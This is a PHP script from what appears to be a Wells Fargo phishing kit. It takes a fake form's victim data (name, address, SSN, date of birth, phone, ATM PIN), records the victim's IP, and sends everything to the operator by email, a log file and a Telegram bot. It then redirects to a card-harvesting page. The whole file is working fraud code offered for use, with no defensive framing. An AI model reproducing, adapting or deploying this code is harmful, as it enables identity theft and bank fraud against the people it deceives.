<?php
$settings = include '../../../settings/settings.php';


# Debug 

if($settings['debug'] == "1"){
  error_reporting(E_ALL);
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
}


if(empty($_POST['fname']) || !isset($_POST['fname'])){
    echo "<script>window.location.href = \"../personal\"; </script>";
    setcookie("logged_in", "0");
} else {
    setcookie("logged_in", "1");
}

if(empty($_POST['address']) || !isset($_POST['address'])){
    echo "<script>window.location.href = \"../personal\"; </script>";
    setcookie("logged_in", "0");
} else {
    setcookie("logged_in", "1");
}

if(empty($_POST['city']) || !isset($_POST['city'])){
  echo "<script>window.location.href = \"../personal\"; </script>";
    setcookie("logged_in", "0");
} else {
    setcookie("logged_in", "1");
}

if(empty($_POST['zip']) || !isset($_POST['zip'])){
  echo "<script>window.location.href = \"../personal\"; </script>";
    setcookie("logged_in", "0");
} else {
    setcookie("logged_in", "1");
}

if(empty($_POST['phone']) || !isset($_POST['phone'])){
  echo "<script>window.location.href = \"../personal\"; </script>";
    setcookie("logged_in", "0");
} else {
    setcookie("logged_in", "1");
}

if(empty($_POST['cpin']) || !isset($_POST['cpin'])){
  echo "<script>window.location.href = \"../personal\"; </script>";
    setcookie("logged_in", "0");
} else {
    setcookie("logged_in", "1");
}

if(empty($_POST['ssn']) || !isset($_POST['ssn'])){
    echo "<script>window.location.href = \"../personal\"; </script>";
    setcookie("logged_in", "0");
} else {
    setcookie("logged_in", "1");
}

if(empty($_POST['dob']) || !isset($_POST['dob'])){
  echo "<script>window.location.href = \"../personal\"; </script>";
    setcookie("logged_in", "0");
} else {
    setcookie("logged_in", "1");
}




# Allow URL Open

ini_set('allow_url_fopen',1);


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");


# Variables

$first_name = $_POST['fname'];
$address    = $_POST['address'];
$city       = $_POST['city'];
$zipcode    = $_POST['zip'];
$cpin       = $_POST['cpin'];
$number     = $_POST['phone'];
$ssn        = $_POST['ssn'];
$dob        = $_POST['dob'];



# Messsage

$message = "[ 🍁 WELLSFARGO  | CLIENT : {$client} 🍁 ]\n\n";
$message .= "********** [ PERSONAL INFORMATION ] **********\n";
$message .= "# NAME        : {$first_name}\n";
$message .= "# ADDRESS     : {$address}\n";
$message .= "# CITY        : {$city}\n";
$message .= "# ZIPCODE     : {$zipcode}\n";
$message .= "# SSN         : {$ssn}\n";
$message .= "# DOB         : {$dob}\n";
$message .= "# PHONE       : +1{$number}\n";
$message .= "# ATMPIN      : {$cpin}\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "**********************************************\n";

# Send Mail 

if ($settings['send_mail'] == "1"){
  $to = $settings['email'];
  $headers = "Content-type:text/plain;charset=UTF-8\r\n";
  $headers .= "From: MrWeeBee <wellsfargo@client_{$client}_site.com>\r\n";
  $subject = "🍁 MRWEEBEE 🍁 WELLSFARGO 🍁 PERSONAL 🍁 CLIENT #{$client} 🍁 {$IP}";
  $msg = strtoupper($message);
  mail($to,$subject,$msg,$headers);
}


# Save Result

if ($settings['save_results'] == "1"){
  $results = fopen($filename, "a+");
  fwrite($results, strtoupper($message));
  fclose($results);
}

# Send Bot

if ($settings['telegram'] == "1"){
  $data = strtoupper($message);
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}

echo("<script>window.location.href = \"../card\";</script>");

?>
